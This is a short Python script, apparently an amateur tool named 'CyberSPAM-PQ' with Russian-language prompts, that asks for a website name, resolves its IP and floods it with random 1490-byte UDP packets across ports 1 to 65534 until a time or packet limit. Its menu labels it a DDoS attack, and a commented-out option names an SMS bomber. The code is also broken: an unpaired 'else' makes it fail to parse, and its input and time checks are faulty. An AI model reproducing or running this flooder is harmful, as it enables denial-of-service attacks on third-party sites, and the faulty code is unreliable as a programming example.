import sys
import os
import time
import socket
import random

os.system("clear")

from datetime import datetime
#now = datetime.now()
#hour = now.hour
#minute = now.minute
#day = now.day
#month = now.month
#year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

limit = 0
app = 0
port = 0

print('##########################################')
print ('Wellcome to CyberSPAM-PQ.softing')
print()
#print ('Get SOFT')
print ('[1] - DDoS Attack http://SITE')
#   print ('[2] - SMS Bomber')
print()
print('##########################################')
print()
            # print
            # app = int(input('select a number to launch the app: '))
            # if app == 1:
print
site = input('Имя сайта: ')
ip = socket.gethostbyname(site)
print ('searching...')
time.sleep(2)
print ('Site IP: ',ip)
print()
print('##########################################')
print()
                        #print
                        #port = int(input('port: '))
                        #print()
now = datetime.now()
hour = now.hour
minute = now.minute
print('Time now: %s:%s'%(hour,minute))
print
limit = int(input('Time attack limit(minute): '))
stopminute = 0
stopminute = minute + limit
print('Stop site attack in: %s:%s'%(hour,stopminute))
print('Maximum: 1 000 000 packs')
print()
igonext = ''
print
igonext = input('Изминить максимальное кол-во пакетов(Да/Нет): ')
if igonext[1] == 'Д':
            print
            maxpack = int(input('Сколько пакетов отправить: '))
            mil = maxpack
            else:
                        mil = 1000000
print()
print('##########################################')

sent = 0

while True:
            now = datetime.now()
            nowminute = now.minute
            print('Stop attack in %s:%s'%(hour,stopminute))
            sock.sendto(bytes, (ip,port))
            sent = sent + 1
            port = port + 1
            stopattack = mil - sent 
            print('     [pack %s] remained %s'%(sent,stopattack))
            
            if port == 65534:
                        port = 1
                        
            if nowminute == stopminute:
                        sys.exit()
                        
            if sent == mil:
                        break
